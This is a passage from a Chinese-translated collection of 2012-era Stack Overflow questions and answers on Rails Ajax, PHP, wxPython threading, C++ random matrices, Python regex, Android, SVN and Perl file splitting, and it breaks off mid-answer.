我想我已经接近了，我只需要获取 javascript 来获取正确的部分并在正确的位置更新 DOM。

谢谢你的帮助。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T19:35:26.720

2：我认为您正在创建两本书，因为您在 CoffeeScript 中触发了表单提交：

```
$('#add-button').click ->
  $(this).parents("form").submit() 
```

Rails 会自动为您做同样的事情（因为您已经在表单上设置了远程属性，Rails 将注入通过 Ajax 发布表单内容所需的客户端脚本）。所以每次提交按钮点击有两个请求。

3：默认情况下，表单会将请求发布到`create`操作，因为您已将新对象传递给，`form_for`因此`list`Ajax 请求永远不会调用该操作。生成的`create`操作会保存新对象，然后重定向到该`show`操作，这就是您看到 /books/:id 的 html 被返回的原因。如果您需要将表单发布到其他操作，则可以通过将`url`选项指定为`form_for`. 例如：

```
<%= form_for @book, :remote => true, :html => { 'data-type' => :html }, :url => { :action => :list } do |f| %> 
```

1：这可能与3有关。Ajax请求没有返回您期望的表行。修复 3 后，您可以开始诊断问题以查看是否调用了此事件：

```
$('form#new_book').on 'ajax:success',  (xhr, data, status) ->
  console.log xhr, data, status
  $('#book-list').append(data).show() 
```

Rails 指南通常是开始学习教程的好地方，但 Ajax 指南看起来有点过时了。Rails 执行 Ajax 的方式可能有点令人困惑。Rails Ajax 请求通常会渲染一个 js.erb 模板以返回 JavaScript（CoffeeScript 也可以），一旦响应到达浏览器就会运行。这样您就不必担心挂钩到 jQuery Ajax 事件，因此您可能需要考虑这种方法。Rails 教程有[一个例子](http://ruby.railstutorial.org/chapters/following-users#sec%3aa_working_follow_button_with_ajax)。

# php - 如何根据值获取复选框，并保存到数据库

> ID：11927883
> 
> 赞同：0
> 
> 时间：2012-08-13T03:32:51.537
> 
> 标签：php, codeigniter, codeigniter-2

我有两个数据库表来管理用户访问：

1.  桌子`Level`

    ```
    lvl_Id| level_name
    1     |  admin
    2     |  user_1
    3     |  user_2 
    ```

2.  桌子`Menu`

    ```
    Menu_name | menu_allowed
    Edit_data | +1+2+
    Print_data| +1+2+3+
    Edit_user | +1+
    Edit_index| +1+2+
    view_index| +1+2+3+ 
    ```

我想要做的是更改`menu_allowed`Table `menu`，在视图页面中使用复选框并更新表格。

这是我在视图页面中的代码：

```
<tr>
<td>Hak akses</td>
<td> : </td>
<td id="check"><?php foreach($test as $data) : ?>
<input type="checkbox" name="menu[]" value="<?php echo $data->menu_allowed ?> " /> <?php echo $data->menu_nama ?> <br />
<?php endforeach; ?></td> 
```

我想要的形式是：

```
User 1 :[v] Edit Data
        [v] Print Data
        [ ] Edit User
        [v] Edit Index
        [v] View Index

User 2 :[ ] Edit Data
        [v] Print Data
        [ ] Edit User
        [ ] Edit Index
        [v] View Index 
```

我的问题是如何获得复选框（如果有数字`menu_name`）以及如何更新表格菜单。例如，如果用户 2，我检查编辑数据并编辑数据库将更新的索引：

```
Menu_name | menu_allowed
Edit_data | +1+2+3+
Print_data| +1+2+3+
Edit_user | +1+
Edit_index| +1+2+3+
view_index| +1+2+3+ 
```

# ruby-on-rails - 清理部分注册

> ID：11927887
> 
> 赞同：0
> 
> 时间：2012-08-13T03:33:52.227
> 
> 标签：ruby-on-rails

我正在开发一个 Rails 应用程序，用户必须填写两个或更多屏幕才能注册。注册数据分布在两个表中的两个或三个记录中。

当然，用户可以在注册完成之前退出。这可以检测为必填列中的空条目。

在合理的延迟（几个小时）之后清理这些部分完成的注册的“Rails 方式”是什么？

如果它有所作为，我将部署在 Heroku 上。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T04:04:18.220

[我不知道这是否是“rails 方式”，但我认为创建一个 rake 任务并通过cron 作业](http://www.thesitewizard.com/general/set-cron-job.shtml)定期运行它可能足以满足您的描述。如果您正在进行测试，您甚至可以像测试任何其他代码一样[测试 rake 任务。](http://www.philsergi.com/2009/02/testing-rake-tasks-with-rspec.html)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T04:15:02.763

您是否考虑过为“进行中”用户设置一个单独的表？然后将其切碎并在完成后将其散布。

`update_at`然后，您只需删除正在进行的表中超过一天的任何内容，就可以清理被遗弃的用户；运行 rake 任务的每日 cron 作业（或调度程序或......）可以解决这个问题。这也可以防止他们在完成之前登录，因为他们在完成之前并不是真正的用户。

作为副作用，他们在完成之前将无法登录，因为他们在完成之前不是真正的用户。当然，您可能需要`current_user`在一个控制器内调整您的处理方式。

这种方法还意味着您可以将 NOT NULL 约束添加到强制列中，作为额外的偏执狂。

# opencpu - OpenCPU 无法打开文件

> ID：11927889
> 
> 赞同：0
> 
> 时间：2012-08-13T03:34:06.877
> 
> 标签：opencpu

更新 #2：再次 jeroen，在你我之间，这就像 OpenCPU <3 的新常见问题解答。沙箱是个好主意，我们不能把脚本放在沙箱里吗？我不想在沙箱关闭的情况下剥夺安全性，你能找到一种方法只允许某些 R 包完全访问服务器吗？我可以手动批准哪些将具有完全访问权限，例如各种管理面板？有没有办法让像我这样的管理员将我自己的脚本放入服务器沙箱中，以便它可以运行具有完全访问权限的情绪化，而其他用户将无法制作它们？

更新：openCPU 对系统运行不在数据存储中的文件有某种保护。如何禁用它，我只是希望它像 R 在同一台机器上一样运行。我知道潜在的人们可以访问数据存储 openCPU 系统之外的文件，而无需 /datastore/ 在文件 url 前面

我在 /opt/myData/test.csv 中放置了一个文件，我可以在 R 的同一个盒子上运行我想要的功能，它可以工作 readTheFile("/opt/myData/test.csv");

现在，当我尝试使用 OpenCPU 使用 REST 调用它时，它不起作用！我什至尝试将文件放在远程服务器上并将文件作为端点读取：/R/mypackage/readTheFile filePath = "http://www.myotherserver.com/test.csv"

我也在下面尝试了这个，这让我无法打开 URL 'http://localhost/R/store/opt/Data-Sets/rds' Endpoint : /R/mypackage/readTheFile filePath = "/opt/myData/test.csv "

请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T20:24:22.363

（2013 年 8 月编辑）：在 OpenCPU 的新版本 1.0 中，OpenCPU 云服务器中的安全配置文件位于`/etc/apparmor.d/opencpu.d`. 添加自定义规则的最简单方法是将它们添加到`/etc/apparmor.d/opencpu.d/custom`文件中。有关详细信息，请参阅[OpenCPU 服务器手册](https://public.opencpu.org/download.html)。

您可能应该学习一些 AppArmor 语法以了解配置文件的结构。有关更多信息，请参阅[RAppArmor 包](https://github.com/jeroenooms/RAppArmor#readme)和[JSS 文章](http://arxiv.org/abs/1303.4808)。

# python - (Python) 在多线程 IRC GUI 中动态附加文本

> ID：11927890
> 
> 赞同：0
> 
> 时间：2012-08-13T03:34:14.627
> 
> 标签：python, wxwidgets

我正在使用 wxPython 编写一个简单的 IRC 服务器和客户端 GUI。在我的应用程序中，我运行了两个线程：一个用于 GUI，一个用于发送和接收信息所需的套接字连接。到目前为止，我相信我已经成功地使用客户端应用程序连接到服务器，但是我没有看到任何消息被处理。我尝试将我的客户端与另一个 TCP 侦听器应用程序一起使用，并且能够成功发送消息。我相信问题在于我设置 GUI 的方式。这是我的服务器端应用程序代码（对任何尴尬的间距表示歉意）

我感觉问题出在 bootUp() 函数中。

```
#!/usr/bin/python

import wx
import socket
import threading
from threading import Thread

ip = ""
port = 0
backlog = 5

chatText = ""

class relayServerGUI(wx.Frame):
def __init__(self, parent, id):
    wx.Frame.__init__(self, parent, id, "Enter IP address", size = (600, 600))
    orciPanel = wx.Panel(self)
    relayChat = wx.TextCtrl(orciPanel, 0, chatText, (50, 50), (500, 500),style              = wx.TE_MULTILINE)
    portInput = wx.TextEntryDialog(None, "Enter Port: ", "")
    if portInput.ShowModal() == wx.ID_OK:
        global port
        port = int(portInput.GetValue())
        thread2()       

def relayInterpretor():
    socketRelay = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socketRelay.bind((ip, port))
    socketRelay.listen(backlog)
    client, address = socketRelay.accept()

    while 1:
                    relayData = client.recv(1024)
                    global chatText
                    chatText += (relayData)
                    client.send(relayData)

def bootUP():
if __name__ == "__main__":
    relayApplication = wx.PySimpleApp()
    relayFrame = relayServerGUI(parent = None, id = -1)
    relayFrame.Show()
    relayApplication.MainLoop()

    while 1:
        relayChat.Clear()
        relayChat.AppendText(chatText)

Thread(target = bootUP).start()
def thread2():
    Thread(target = relayInterpretor).start() 
```

编辑：relayChat 是理想情况下显示消息的地方。我将它设置为复制 chatText，一个全局字符串变量，因此我不必深入研究跨线程。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T03:48:18.947

我对 wx 不是很流利，但我认为这个问题无论如何都与 wx 无关。我在这里看到两个可能的问题。

首先，您在线程之间共享一个字符串以将文本传递给`relayChat`小部件，这通常是一种非常糟糕的方法。应该有一种方法可以让您从线程中发出 wx 中的事件，以便事件循环将在主线程中获取它并运行更新小部件的处理程序。

其次，事件循环...

```
relayApplication.MainLoop() 
```

那是一个阻塞调用。您的应用程序进入事件循环，因此以下代码不会被执行：

```
while 1:
    relayChat.Clear()
    relayChat.AppendText(chatText) 
```

同样，这与第一点有关。当线程中的套接字接收到一些数据时，它应该使用该数据发出一个事件，因此主 gui 线程可以正确调用将附加到您的小部件的处理程序。

**更新**

参考[这个](https://stackoverflow.com/questions/2345608/wxpython-threading-gui-using-custom-event-handler)关于如何发出自定义 wx 事件的问题，您可能可以像这样修复它：

```
from wx.lib.newevent import NewEvent

ChatTextEvent, EVT_CHATTEXT = NewEvent()

class relayServerGUI(wx.Frame):
    def __init__(self, parent, id):
        ...
        # make sure to save a ref to your chat widget
        self.relayChat = wx.TextCtrl(orciPanel, 0, chatText, (50, 50), (500, 500),style              = wx.TE_MULTILINE)
        self.Bind(EVT_CHATTEXT, self.newChatTextEvent)
        ...
        thread2(self)

    def newChatTextEvent(self, event):
        self.relayChat.AppendText(event.data)

def relayInterpretor(wxObject):
   ...
   while 1:
      ...
      # wxObject needs to be an instance of relayServerGUI
      wx.PostEvent(wxObject, ChatTextEvent(data=relayData))

def thread2(wxObject):
    Thread(target = relayInterpretor, args=(wxObject,)).start() 
```

*注意：我不是 100% 的那种语法。试试看。它可能需要稍作调整。

# c++ - 如何在 C++ 中生成随机矩阵？

> ID：11927891
> 
> 赞同：2
> 
> 时间：2012-08-13T03:34:22.837
> 
> 标签：c++, c, algorithm, random, random-sample

我想生成一个具有固定稀疏度和随机索引和值的矩阵。

为了简化问题，以数组为例：生成一个 arr[10] 只有 3 个位置且非零值。如果我只是将这 3 个索引一一随机，由于重复，算法的效率很差。

更困难的是，我还想生成一个秩为 k 的随机矩阵，因为 null cols 和 rows 可能会导致我的代码出现错误......这次如何做到？

谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-13T06:12:20.883

您可以使用 STL 的**random_shuffle**来完成此操作：

```
#include <vector>
#include <algorithm>

// Function that generates random array elements
int random_element();

const int n = 10;  // Size of the array
const int k = 4;   // Number of random (non-zero) elements in the array
int a[n];          // The array, filled with zeros

int main()
{
  for (size_t i = 0; i < k; ++i)
    a[i] = random_element();

  std::random_shuffle(a, a + n);

  // Now 'a' contains k random elements and (n-k) zeros, in a random order
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T03:45:25.827

如果数组的大小为 N 并且 K 是非零条目的数量，请执行以下操作：

```
ARRAY_ELT_TYPE a[N];
int r[N];
for (i = 0; i < N; i++) { a[i] = 0; r[i] = i; }
for (i = 0; i < K; i++) {
  swap(r[i], i + random_nonneg_less_than(N - i));
  a[r[i]] = nonzero_value();
} 
```

正如已经指出的那样，您还可以将非零元素放在数组的开头并对其进行洗牌。如果您只初始化一次，这显然是一个更好的算法。

`a`当您必须多次重新初始化为不同的随机矩阵时，上述算法的优势就来了。只是留在身边`r`。不需要重新初始化。随后每次插入 K 个非零元素只需要 K 步。如果 K 比 N 小，这可能是一个很大的胜利：

```
ARRAY_ELT_TYPE a[N];
int r[N];

// Initialize one time.
for (i = 0; i < N; i++) { a[i] = 0; r[i] = i; }
j = 0;

for (many, many iterations) {

  // Insert non-zero values in K steps.
  for (i = 0; i < K; i++) {
    swap(r[i], i + random_nonneg_less_than(N - i));
    a[r[i]] = nonzero_value();
  }

  //
  // USE RANDOM ARRAY a HERE
  //

  // Re-zero a in only K steps.
  for (i = 0; i < K; i++) a[r[i]] = 0;  
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T14:50:44.180

任何 N 维数组都可以展平为一维（为了枚举其所有元素）。假设您有一个 5x7 数组 - 这意味着其中总共有 35 个元素。

一旦你“填充”了第一个元素，可用槽的总数就会减少一个，所以你可以看到你的数组现在只有 34 个“空”点 - 因此你现在需要做的就是在索引在 0 到 33 之间，并记住在定位该元素时跳过已经填充的索引。

第二部分可能会很耗时，所以如果你的数组总是非常稀疏，你可以在一个单独的数组中列出所有那些“采取”的点......不，这对你没有多大帮助。所有点的单独链接列表也将效率低下 - 将需要太多时间（相对）来分配和遍历每次迭代。

本质上，问题是在修改后的数组中找到一种快速索引方法，其中元素的总数表示尚未拍摄的点，对于**稀疏**数组，记录这些点的任何方式都将超过发生碰撞时生成下一个随机索引所需的时间。

只有当数组或多或少密集填充时（“或多或少”对我来说是一个未知值，但我希望它高于 60%-70%）才能保持记录使用的元素的数量可能超过生成非重复索引所需的时间。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2017-03-07T23:00:19.253

```
#include <iostream>
#include <stdlib.h>

using namespace std;
int main(){
    int A[100][100],filas,columnas,m,k,n;
    cout<<"filas";
    cin>>filas;
    cout<<"columnas";
    cin>>columnas;
    n=filas*columnas;
    srand(time(NULL));
    for(int i=0;i<filas;i++){
        for(int j=0;j<columnas;j++){
            for (k=1; k<=n; k++){
                m= 1+rand()% (n - 1);
            A[i][j]= m;
            }
        }
    }
    for(int i=0;i<filas;i++){
        for(int j=0;j<columnas;j++){
            cout<<A[i][j]<<" ";
        }
        cout<<"\n";
    }

    return 0;

} 
```

好吧，我是编程新手，我正在寻找一种创建带有随机条目的矩阵的方法，我这样做并且确实有效，希望这对您有用。:D

# python - Python：仅保留字符串中的单词，每个单词都在换行符上

> ID：11927894
> 
> 赞同：0
> 
> 时间：2012-08-13T03:34:53.223
> 
> 标签：python, regex, string

我有一个大文本文件，其中的单词散布着数字和两种类型的字符，a`'|'`和`'.'`. 我在 StackOverflow 上进行了搜索，发现如何获取这个字符串并且只保留字母。例如，如果

```
old_fruits='apple|0.00|kiwi|0.00|0.5369|-0.2437|banana|0.00|pear' 
```

然后

```
re.sub("[^A-Za-z]","",old_fruits) 
```

会回来

```
'applekiwibananapear' 
```

我正在尝试将这些单词写到一个文件中，每行一个单词，然后是换行符，然后是下一个单词，例如：

```
apple
kiwi
banana
pear 
```

任何想法或指向正确的方向表示赞赏。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-13T03:41:38.883

尝试这个：

```
import re

old_fruits = 'apple|0.00|kiwi|0.00|0.5369|-0.2437|banana|0.00|pear'

with open('fruits.out', 'w') as f:
    fruits = re.findall(r'[^\W\d]+', old_fruits)
    f.write('\n'.join(fruits)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-13T03:52:58.610

您可以在不使用正则表达式的情况下执行此操作。在管道字符上拆分字符串，使用生成器表达式和 inbuild`string.isalpha()`函数过滤掉那些仅是字母字符的单词，并将它们连接起来形成最终输出：

```
old_fruits = 'apple|0.00|kiwi|0.00|0.5369|-0.2437|banana|0.00|pear'
words = (word for word in old_fruits.split('|') if word.isalpha())
new_fruits = '\n'.join(words)

print(new_fruits) 
```

输出是

```
apple
kiwi
banana
pear 
```

根据需要（未写入文件，但我假设您能够应对）。

**编辑：**敲了一个快速脚本来提供一些正则表达式与非正则表达式的时间比较：

```
import timeit

# Setup - not counted in the timing so it doesn't matter we include regex for both tests
setup = r"""old_fruits = 'apple|0.00|kiwi|0.00|0.5369|-0.2437|banana|0.00|pear'
import re
fruit_re=re.compile(r'[^\W\d]+')
"""

no_re = r"""words = (word for word in old_fruits.split('|') if word.isalpha())
new_fruits = '\n'.join(words)"""

with_re = r"""new_fruits = '\n'.join(fruit_re.findall(old_fruits))"""

num = 10000

print("Short input")
t = timeit.timeit(no_re, setup, number=num)
print("No regex: {0:.2f} microseconds to run".format((t*1e6)/num))
t = timeit.timeit(with_re, setup, number=num)
print("With regex: {0:.2f} microseconds to run".format((t*1e6)/num))

print("")
print("100 times longer input")

setup = r"""old_fruits = 'apple|0.00|kiwi|0.00|0.5369|-0.2437|banana|0.00|pear'*100
import re
fruit_re=re.compile(r'[^\W\d]+')"""

t = timeit.timeit(no_re, setup, number=num)
print("No regex: {0:.2f} microseconds to run".format((t*1e6)/num))
t = timeit.timeit(with_re, setup, number=num)
print("With regex: {0:.2f} microseconds to run".format((t*1e6)/num)) 
```

我电脑上的结果：

```
Short input
No regex: 18.31 microseconds to run
With regex: 15.37 microseconds to run

100 times longer input
No regex: 793.79 microseconds to run
With regex: 999.08 microseconds to run 
```

因此，预编译的正则表达式在短输入字符串上更快，对于更长的输入字符串，生成器表达式更快（至少在我的计算机上 - Ubuntu Linux，Python 2.7 - 结果可能因您而异）。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T03:40:58.920

```
of=old_fruits.split("|")
for i in range(0,len(of),2):
 # write to file 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-13T03:38:07.373

使用 OP 的代码作为基础：

```
import re
old_fruits = 'apple|0.00|kiwi|0.00|0.5369|-0.2437|banana|0.00|pear'

with open('outdata.txt', 'w') as f:
    f.write('\n'.join(re.sub("[^A-Za-z]"," ",old_fruits).split())) 
```

给

```
apple
kiwi
banana
pear 
```

在文件中`'outdata.txt'`。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-08-13T03:39:18.380

答案并不难，虽然我不知道这是否是最佳实践，但为什么不

```
print re.sub("[^A-Za-z]+","\n",old_fruits) #re.sub("[^A-Za-z]+","\n",old_fruits) is the string you want 
```

“+”表示 1+ 个非字母字符实例将被替换为 \n

# iphone - 如何使用 IOS 中的提示要求用户输入用户名和密码

> ID：11927895
> 
> 赞同：1
> 
> 时间：2012-08-13T03:34:59.563
> 
> 标签：iphone, ios, ios5, login, prompt

我想让用户输入用户名和密码，而不必使用 UIviewcontroller。如何使用发布请求将用户名和密码从警报提示发送到 https 服务器？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T04:03:45.473

您可以使用 UIAlertVuew 执行 Promtbox。

这是一个对你有帮助的帖子，请查看我的帖子。

[如何在警报视图中提示用户输入文本](https://stackoverflow.com/questions/7015842/how-to-prompt-user-for-text-input-in-alert-view/10892922#10892922)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T04:05:53.307

[也许你可以在这里](http://www.cocoacontrols.com/platforms/ios/controls/ddalertprompt)试试 DDAlertView

# javascript - Javascript：使用外部脚本

> ID：11927897
> 
> 赞同：0
> 
> 时间：2012-08-13T03:35:20.977
> 
> 标签：javascript

我正在尝试将一个简单的脚本导入 HTML 文档。它不起作用，我不知道我做错了什么。

外部脚本的名称--> (function.js)

```
window.onload = myFunction;

       function myFunction() 
       {
             document.getElementById("HERE").innerHTML = "message";
       } 
```

HTML 文档的名称--> (attributes.html)

```
<!DOCTYPEhtml>

    <html>
    <head>

         <title> This is an example of using an external script</title> 
            <script type ="text/javascript" src= "function.js"></script>
    </head>
    <body>

          <h1 id="HERE"> 
          </h1>

    </body>
    </html> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-13T07:16:35.943

我认为在 js 文件运行之前，body on load 事件触发得太早了。尝试至少使用“window.onload”中的“document.body.onload”。尝试使用“document.attachEvent”：

```
document.attachEvent(document.body, "load", myFunction) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T08:10:46.343

```
<html>
<head>

     <title> This is an example of using an external script</title> 
        <script type ="text/javascript" src= "function.js"></script>
</head>
<body>

      <h1 id="HERE"> 
      </h1>

     <script>myFunction() </script>
</body>
</html> 
```

# html - 在 CANVAS 中创建整个网站怎么样？

> ID：11927900
> 
> 赞同：15
> 
> 时间：2012-08-13T03:35:54.657
> 
> 标签：html, canvas, seo, cross-browser

我正在从头开始设计一个新网站，并想知道在一个`<canvas>`元素内开发整个网站会有什么缺点。

我知道与 IE6/7/8 的兼容性问题，但这对这个项目并不重要。但我确实关心，例如，谷歌搜索引擎的行为和移动兼容性。

我选择这种方式的主要原因是有可能在元素和图片上编写高级效果和动画，这是纯 HTML5/CSS 无法实现的。

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-13T04:02:53.150

画布是光栅图形的元素。它适用于部分页面，但不适用于整个页面。页面是文档。它也需要是机器可读的。如果您的整个网站由画布组成，那么搜索引擎机器人、屏幕阅读器、浏览器插件和其他软件将无法访问它。使用画布创建网站就像使用绘图程序而不是文字处理器准备文档一样。这是可能的，但不切实际。对于实验来说可能是一个好主意，但如果你是为了生产而这样做，那么你应该重新考虑。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2021-01-26T08:37:07.800

这就像使用 WebGL 创建网站一样！我们使用它们来获得更好的视觉体验，但它们不适用于屏幕阅读器和爬虫。为了解决这个问题，我们可以为特定设备创建内容并将它们隐藏在其他设备上。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-09-29T13:15:19.427

我自己的网站是一个 Canvas 和一个大 Javascript（来自 Typescript），所以是的，它是可行的，它可以自动缩放以在手机上查看，也可以自动旋转......

如果您有兴趣：[www.erroba.be](http://www.erroba.be)（我的名字的首字母缩写**Erlen** Roba **ye**）

 **我相信您可以查看源代码并获得一些想法。**

# mysql - 不确定 mysql_fetch_array 是否正在返回结果

> ID：11927901
> 
> 赞同：2
> 
> 时间：2012-08-13T03:36:10.567
> 
> 标签：mysql

所以我试图从 MySQL 中获取数据，但我不确定数组是否被返回。

这是一个测试 php 文件，用于检查函数是否正常工作。

```
<?php
include_once('Private/dbInfo.php');
 $db = new dbObject();
 $db->connect();
 $db->getBusInfo();
?> 
```

这是功能。此外，名为标记的数据库具有字段名称、id 和时间，但出于测试目的只是试图获取名称。为什么没有输入 while($info = mysql_fetch_array( $data )) ？

```
public function getBusInfo() {
    $data = mysql_query("SELECT * FROM `markers`")
        or die(mysql_error()); 

        while($info = mysql_fetch_array( $data )) 
        { 
          echo "name"+$info['name'];
        } 
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-30T00:11:54.010

以下是您的 while 语句未输入的原因：

1.  在到达 while 语句之前发生了一些错误，并且您关闭了显示错误
2.  永远不会调用 getBusInfo() 函数，这意味着代码在某处调用了一些不同的 getBusInfo() 函数
3.  你的表是空的（没有数据）

# php - 为什么在 PHP 中使用 'Array()' 而不是 'new Array()'？

> ID：11927902
> 
> 赞同：2
> 
> 时间：2012-08-13T03:36:34.547
> 
> 标签：php, arrays, object

PHP 中的其他对象是使用`new`限定符来实例化的，例如，等等。在 PHP 中实例化新数组时`new Date()`，为什么不提供`new`限定符？`Array()`

```
$array = new Array(); //blows up
$array = Array();     //works as intended

$reflect = new ReflectionClass($this);   //works as intended
$reflect = ReflectionClass($this);       //blows up 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-13T03:40:13.863

Array 是一种语言构造而不是类，因此您不能使用 new 来实例化 Array 对象。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-13T03:39:42.490

因为`array`是语法，而不是类。与`list`,`echo`和其他一些相同。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-13T03:49:09.900

除非您创建“Array”类，否则它将“爆炸”，因为 PHP 没有内置的 Array 类。

数组不是一个类，而是一个函数。

出于同样的原因，你不能这样做

```
$myvar = new print('hello'); 
```

那会很疯狂，不是吗？`print()`, 像`array()`, 是 PHP 内置的函数，而不是类。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-13T03:42:28.127

数组在 php 中甚至在面向对象的方式被引入之前就已经存在

将其视为 C 语言数组，仍然可以在 C++ 中使用 :)

# android - MediaPlayer 音频有时会被切断，但并非总是如此

> ID：11927903
> 
> 赞同：3
> 
> 时间：2012-08-13T03:36:41.993
> 
> 标签：android

我正在播放这样的音频文件：

```
 MediaPlayer player;
        player=MediaPlayer.create(context, R.raw.sound);
        player.setLooping(false);

        player.setOnCompletionListener(new OnCompletionListener() 
        {      
            public void onCompletion(MediaPlayer player)
            {  
                player.release();       
            }            

        }); 
        player.start(); 
```

问题是有时它会在中间切断音频（或开始并不再播放）。如果我重新启动手机，问题似乎已解决，但一段时间后再次出现。有人能告诉我到底出了什么问题吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T07:12:18.380

打电话`player.prepare()`之前`player.start()`

为了更好地了解 MediaPlayer 的工作原理，请查看此状态图：

[http://developer.android.com/images/mediaplayer_state_diagram.gif](http://developer.android.com/images/mediaplayer_state_diagram.gif)

# svn - SVN - 试图从我的仓库中删除一个我在错误位置导入的文件

> ID：11927904
> 
> 赞同：2
> 
> 时间：2012-08-13T03:36:45.127
> 
> 标签：svn

我不小心将一个文件导入了我的仓库中的错误位置。现在我想从我的仓库中删除它。

我尝试使用：

```
svn delete https://mysubdomain.svn.beanstalkapp.com/repo/trunk/badfile 
```

但是当我这样做时，我得到一个看起来像这样的屏幕

```
--This line, and those below, will be ignored--

D    https://mysubdomain.svn.beanstalkapp.com/repo/trunk/badfile

----:---F1  svn-commit.8.tmp   All L1     (Fundamental)---------------------------------------------------------------------------------------------------------
Loading vc...done 
```

一旦我点击这个屏幕，我就完全迷失了。任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-13T05:44:37.007

基本上没有错误。您只需要输入一条日志消息，保存并退出。

你可以做两件事：

*   查找 VIM 教程[（此处有一个）](http://blog.interlinked.org/tutorials/vim_tutorial.html)。VIM 是 SVN 在需要输入提交信息时默认启动的文本编辑器。
*   将您的环境变量更改`SVN_EDITOR`为您更熟悉的内容。[这](http://www.techchorus.net/how-set-svneditor-environment-variable-vim)是一个小的操作方法，尽管它将它设置为您可能不想要的 VIM。

# regex - 比较文件并将相似的数据存储到不同的文件中

> ID：11927905
> 
> 赞同：0
> 
> 时间：2012-08-13T03:36:51.060
> 
> 标签：regex, string, perl

```
**LIST.txt**
lambo
audi
bmw
merc
ferrari 
```

LIST 是包含汽车名称的文件，DETAILS 是包含在 LIST.txt 中命名的汽车详细信息的文件

```
**DETAILS.txt**
lambo_1 gallardo lp570
lambo_2 aventador lp700
lambo_3 reventon lp640
audi_1 R8 V10
audi_2 A8 diesel 
bmw_1 Z4 blue
bmw_2 M3 red
bmw_3 328i black
merc_1 slr mclaran
merc_2 sls wings 
```

我想将每辆车的详细信息分成不同的文件，即在这种情况下我想要 4 个文件，其中兰博、奥迪、宝马和 merc 详细信息在不同的文件中，如 file_1.txt、file_2.txt、file_3.txt 和 file_4.txt

```
file_1.txt
 lambo_1 gallardo lp570
    lambo_2 aventador lp700
    lambo_3 reventon lp640 
```

与其他文件类似

我是 perl 的新手，我需要你的帮助。我尝试通过搜索每个元素并将其存储到文件中（更改文件名的计数器）来做到这一点，但我没有得到预期的结果。所以任何人都可以帮助我。

```
 use strict;
  use warnings;    
  my $counter;    
  open  my $fh, "<", "F1.txt" or die $!;  
  open  my $fh1, "<", "F2.txt" or die $!;    
  my @b = <$fh>;  my @a = <$fh1>;
  for (@b)  
  {        
    my $line1 = $_;         
    for (@a)        
    {              
      $line2 = $_;              
      if ($line1 =~ /^$line2$/)              
      {        
        $counter++;                    
        open my $outfile, ">>", "A_${counter}.txt";                    
        print $outfile $line2;                    
        close $outfile;              
      }   
    } 
  } 
```

我正在尝试做这样的事情，但它没有按要求为我提供正确的答案

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-14T10:29:27.890

这是多路复用的基本练习。[我们甚至在Intermediate Perl](http://www.intermediateperl.com)中有一个示例（印刷版今天上架了）。

您可以打开一堆写文件句柄，每种车型一个，将它们存储在哈希中，然后在遇到它时查找您需要的那个。与其他多次扫描细节的答案不同（以及将整个内容读入内存），这具有扫描细节的优势。

第一部分使用[map](http://perldoc.perl.org/functions/map.html)根据*list.txt*中的汽车创建输出文件句柄的哈希：

```
use v5.14;

my %out_fhs = do {
    open my $list_fh, '<', 'list.txt' or die;
    map { 
        state $n = 0;
        $n++;
        chomp;
        open my $fh, '>', "file_$n.txt" or die;
        ( $_, $fh )
        } <$list_fh>;
    }; 
```

第二部分通过*details.txt*，使用您刚刚创建的文件句柄的哈希：

```
open my $details_fh, '<', 'details.txt' or die;

DETAIL: while( <$details_fh> ) {
    chomp;
    my( $car ) = m/\A(.*?)_/;
    my $fh = $out_fhs{ $car } || do {
        warn "Car [$car] is not in list.txt. Skipping.\n";
        next DETAIL;
        }

    say $fh $_;
    } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-13T04:11:21.697

```
#!/usr/bin/env perl

use strict;
use warnings;

my %cars;
open my $fh, '<', 'F1.txt' or die $!;
while (<$fh>) {
    chomp;
    $cars{lc $_} = undef;
}
close $fh;

open $fh, '<', 'F2.txt' or die $!;
my $num = 1;
while (<$fh>) {
    if (/\s*([a-z]+)_\d+/i) {
        my $k = lc $1;
        if (exists $cars{$k}) {
            if (!defined $cars{$k}) {
                open my $fd, '>', "file_$num.txt" or die $!;
                $cars{$k} = $fd;
                $num++;
            }
            print {$cars{$k}} $_;
        }
    }
}
close $fh; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-13T05:55:43.317

这是生成 file_audi.txt 等的另一个选项：

```
use Modern::Perl;

{
    open my $DETAILSIn, '<', 'DETAILS.txt' or die $!;
    my @details = <$DETAILSIn>;

    open my $LISTIn, '<', 'LIST.txt' or die $!;
    while ( my $car = <$LISTIn> ) {
        chomp $car;
